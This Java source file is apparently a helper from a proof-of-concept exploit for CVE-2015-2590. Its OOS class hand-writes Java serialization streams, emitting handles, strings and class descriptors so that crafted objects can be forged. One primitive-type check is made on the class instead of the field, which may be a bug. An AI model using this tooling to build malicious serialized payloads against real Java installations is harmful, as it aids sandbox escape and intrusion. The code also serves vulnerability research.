package poc.cve_2015_2590;

import static java.io.ObjectStreamConstants.*;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.Externalizable;
import java.io.IOException;
import java.io.ObjectStreamClass;
import java.io.ObjectStreamField;
import java.io.Serializable;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class OOS extends DataOutputStream {
	
	private Map< Object, Integer > handles;
	private int curHandleNum;
	
	public OOS( ) throws IOException {
		super( new ByteArrayOutputStream( ) );
		
		this.handles = new HashMap< Object, Integer >( );
		this.curHandleNum = 0;
		
		this.writeShort( STREAM_MAGIC );
		this.writeShort( STREAM_VERSION );
	}
	
	public byte[ ] toByteArray( ) {
		return ( ( ByteArrayOutputStream ) this.out ).toByteArray( );
	}
	
	// Handle methods
	
	public void cleanHandles( ) {
		this.handles.clear( );
		this.curHandleNum = 0;
	}
	
	public int getHandle( Object o ) {
		Integer h = this.handles.get( o );
		if( h != null ) {
			return h;
		}
		return -1;
	}
	
	public boolean writeHandle( Object o ) throws IOException {
		Integer h = this.handles.get( o );
		if( h != null ) {
			this.writeByte( TC_REFERENCE );
			this.writeInt( baseWireHandle + h );
			return true;
		}
		return false;
	}
	
	private void assignHandle( Object o ) {
		if( !this.handles.containsKey( o ) ) {
			this.handles.put( o, this.curHandleNum++ );
		}
	}
	
	
	// Object serialization methods
	
	public void writeNull( ) throws IOException {
		this.writeByte( TC_NULL );
	}
	
	public void writeString( String s ) throws IOException {
		if( this.writeHandle( s ) ) {
			return;
		}
		this.assignHandle( s );
		long len = Utils.utfLength( s );
		if( len <= 0xFFFF ) {
			this.writeByte( TC_STRING );
			this.writeShort( ( int ) len );
		}
		else {
			this.writeByte( TC_LONGSTRING );
			this.writeLong( len );
		}
		this.writeBytes( s );
	}
	
	public void writeClassDesc( ObjectStreamClass osc ) throws IOException {
		if( this.writeHandle( osc ) ) {
			return;
		}
		
		final Class< ? > f = osc.forClass();
		if( Proxy.isProxyClass( f ) ) {
			throw new AssertionError( "Can't serialize Proxy classes." );
		}
		this.assignHandle( osc );
		
		this.writeByte( TC_CLASSDESC );
		
		this.writeUTF( osc.getName( ) );
		this.writeLong( osc.getSerialVersionUID( ) );
		
		byte flags = 0;
		if( Externalizable.class.isAssignableFrom( f ) ) {
			flags |= SC_EXTERNALIZABLE;
			flags |= SC_BLOCK_DATA;
		}
		else if( Serializable.class.isAssignableFrom( f ) ) {
			flags |= SC_SERIALIZABLE;
		}
		else {
			throw new IOException( f + " is not serializable or externalizable." );
		}
		this.writeByte( flags );
		
		ObjectStreamField[] fields = osc.getFields();
		this.writeShort( fields.length );
		for( ObjectStreamField field : fields ) {
			this.writeByte( field.getTypeCode() );
			this.writeUTF( field.getName() );
			if( !f.isPrimitive() ) {
				this.writeString( field.getTypeString() );
			}
		}
		
		this.writeByte( TC_ENDBLOCKDATA );
	}
	
	public void startObject( Object marker, ObjectStreamClass[ ] descs ) throws IOException {
		if( marker == null ) marker = new Object( );
		
		if( this.writeHandle( marker ) ) {
			return;
		}
		this.writeByte( TC_OBJECT );
		for( ObjectStreamClass osc : descs ) {
			if( this.writeHandle( osc ) ) {
				this.assignHandle( marker );
				return;
			};
			
			this.writeClassDesc( osc );
		}
		this.writeNull( );
		
		this.assignHandle( marker );
	}
	
}
